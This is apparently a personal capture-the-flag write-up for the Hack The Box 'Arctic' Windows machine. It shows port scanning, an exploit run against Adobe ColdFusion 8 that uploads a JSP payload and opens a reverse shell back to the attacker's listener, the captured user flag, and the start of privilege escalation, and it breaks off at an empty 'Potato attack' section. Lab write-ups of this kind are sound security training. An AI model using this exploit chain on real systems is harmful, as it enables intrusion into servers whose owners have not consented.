---
date: 2024-10-10
title: Arctic HTB Write-Up
machine_ip: 10.10.10.11
os: Windows
difficulty: Easy
my_rating: 
tags:
  - Windows
  - PrivEsc
references: "[[📚CTF Box Writeups]]"
---
# INSTALL ONTO DESKTOP KALI VM ALSO
==[Rustscan](https://github.com/RustScan/RustScan/wiki/Installation-Guide) ==
`-a <IP> -t 500 -b 1500 -- -A` 
`-- -`
	- `then nmap tacks`
	- Misses some open ports so also use **nmap**

==feroxbuster==
- `sudo apt-get install feroxbuster`


---

# Enumeration

- Rustscan
```
┌──(root㉿swabby)-[~/Downloads]
└─# rustscan -a 10.10.10.11 -t 500 -b 1500 -- -sVC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.11:135
Open 10.10.10.11:8500
Open 10.10.10.11:49154
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 14:23 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
Initiating Ping Scan at 14:23
Scanning 10.10.10.11 [4 ports]
Completed Ping Scan at 14:23, 0.61s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:23
Completed Parallel DNS resolution of 1 host. at 14:23, 0.41s elapsed
DNS resolution of 1 IPs took 0.41s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:23
Scanning 10.10.10.11 [3 ports]
Discovered open port 135/tcp on 10.10.10.11
Discovered open port 49154/tcp on 10.10.10.11
Discovered open port 8500/tcp on 10.10.10.11
Completed SYN Stealth Scan at 14:23, 0.20s elapsed (3 total ports)
Initiating Service scan at 14:23
Scanning 3 services on 10.10.10.11
Completed Service scan at 14:26, 161.56s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.11.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 11.50s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 5.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 0.00s elapsed
Nmap scan report for 10.10.10.11
Host is up, received echo-reply ttl 127 (0.46s latency).
Scanned at 2024-10-10 14:23:48 EDT for 179s

PORT      STATE SERVICE REASON          VERSION
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
8500/tcp  open  fmtp?   syn-ack ttl 127
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:26
Completed NSE at 14:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.91 seconds
           Raw packets sent: 7 (284B) | Rcvd: 7 (324B)
```

==- web enum
	- feroxbuster
	- gobuster
	- dirsearch
	- dirbuster
	- whatweb
==

- The Managed File Transfer Protocol (mftp) on port 8500 that is open at `http://10.10.10.11:8500/` shows directories we can browse.
	- We also found during enumeration `http://10.10.10.11:8500/CFIDE/administrator/` which leads us to a Web Portal for Adobe Cold Fusion 8 Administrator
	- Upon research, we find that:
		- "ColdFusion scripts are commonly run as an elevated user, such as NT-Authority\SYSTEM (Windows) or root (Linux), making them especially susceptible to web-based attacks."

# Foothold
- gain shell via exploit
- Using `searchsploit`, we find an exploit for Adobe ColdFusion 8 - Remote Command Execution (RCE), `cfm/webapps/50057.py`
```
┌──(root㉿swabby)-[~/Downloads]
└─# searchsploit Adobe ColdFusion 8
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
...
Adobe ColdFusion 8 - Remote Command Execution (RCE)                               | cfm/webapps/50057.py
...
```

- Running this exploit and specifying the lhost, lport, rhost, and rport, we can get a shell
```
┌──(root㉿swabby)-[~/Downloads]
└─# python3 ./50057.py

Generating a payload...
Payload size: 1497 bytes
Saved as: 63f11d8a07d1477dad1838d737b6aad1.jsp

Priting request...
Content-type: multipart/form-data; boundary=fae0014bf9974fbe87c057c88e20fa06
Content-length: 1698

--fae0014bf9974fbe87c057c88e20fa06
Content-Disposition: form-data; name="newfile"; filename="63f11d8a07d1477dad1838d737b6aad1.txt"
Content-Type: text/plain

Printing some information for debugging...
lhost: 10.10.14.31
lport: 4444
rhost: 10.10.10.11
rport: 8500
payload: 63f11d8a07d1477dad1838d737b6aad1.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.11] 49852



Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

- Now that we have user, we can grab user flag and work on escalating
```
C:\Users\tolis\Desktop>type user.txt
type user.txt
6cd6312904873a6491b4e01b8c7c36f8
```
# PrivEsc
- escalate from webshell/user to root
- We see we have `SeImpersonatePrivilege`
```
C:\Users\tolis\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

- Lets try a Potato attack
```

```
